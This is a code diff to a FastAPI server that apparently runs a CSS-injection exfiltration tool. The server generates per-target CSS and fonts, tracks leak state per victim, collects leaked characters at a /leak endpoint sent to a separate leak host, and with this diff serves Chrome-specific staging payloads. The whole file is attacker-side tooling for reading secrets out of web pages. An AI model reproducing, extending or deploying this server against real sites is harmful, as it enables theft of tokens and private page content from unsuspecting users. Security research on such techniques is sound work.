@@ -12,6 +12,8 @@ from .logger import logger
 from .cssgen import dynamic as dynamic_css
 from .fontgen import dynamic as dynamic_font
 import asyncio
+from user_agents import parse
+from typing import Literal
 
 # Add in-memory storage for leak states and events
 leak_states: dict[str, DynamicLeakState] = {}
@@ -25,6 +27,21 @@ app = FastAPI(
 
 # Setup templates
 templates = Jinja2Templates(directory="templates")
+
+
+def get_browser(request: Request) -> Literal["chrome", "safari", "firefox", "all"]:
+    user_agent = parse(request.headers.get("user-agent", ""))
+
+    if user_agent.browser.family == "Chrome":
+        browser = "chrome"
+    elif user_agent.browser.family == "Safari":
+        browser = "safari"
+    elif user_agent.browser.family == "Firefox":
+        browser = "firefox"
+    else:
+        browser = "all"
+
+    return browser
 
 
 @app.get("/")
@@ -52,6 +69,7 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
         if params.id is None or params.id not in leak_states:
             new_id = str(len(leak_states) + 1) if params.id is None else params.id
             font_path, step_map = dynamic_font.generate(params.alphabet)
+            browser = get_browser(request)
             leak_states[new_id] = DynamicLeakState(
                 id=new_id,
                 setup=base_params,
@@ -59,18 +77,20 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
                 reconstruction="",
                 step_map=step_map,
                 font_path=font_path,
+                browser=browser,
             )
             params.id = new_id
 
     state = leak_states[params.id]
 
-    if params.staging:
+    if params.staging and state.browser == "chrome":
         template = templates.get_template("dynamic-staging.css.jinja")
         css = dynamic_css.generate_staging(
             id=state.id,
             step=state.step,
             host=settings.host,
             template=template,
+            browser=state.browser,
         )
         return Response(content=css, media_type="text/css")
 
@@ -83,7 +103,9 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
         alphabet_size=len(params.alphabet),
         font_path=state.font_path,
         host=settings.host,
+        host_leak=settings.host_leak,
         leak_selector=params.selector,
+        browser=state.browser,
     )
     return Response(content=css, media_type="text/css")
 
@@ -95,7 +117,7 @@ def generate_static_payload(params: StaticLeakSetupParams = Depends()):
 
 
 @app.get("/leak")
-async def leak(request: Request, params: DynamicLeakParams = Depends()):
+def leak(request: Request, params: DynamicLeakParams = Depends()):
     logger.debug("Handling leak request with params: %s", params)
 
     if isinstance(params, DynamicLeakParams):
@@ -121,7 +143,16 @@ async def leak(request: Request, params: DynamicLeakParams = Depends()):
 
 
 @app.get("/test")
-def test():
+def test(request: Request):
     logger.debug("Handling test request")
-    with open("templates/test.html", "r") as f:
-        return Response(content=f.read(), media_type="text/html")
+    browser = get_browser(request)
+    if browser == "chrome":
+        return Response(
+            content=templates.get_template("test_dynamic_chrome.html.jinja").render(),
+            media_type="text/html",
+        )
+
+    return Response(
+        content=templates.get_template("test_dynamic_all.html.jinja").render(),
+        media_type="text/html",
+    )
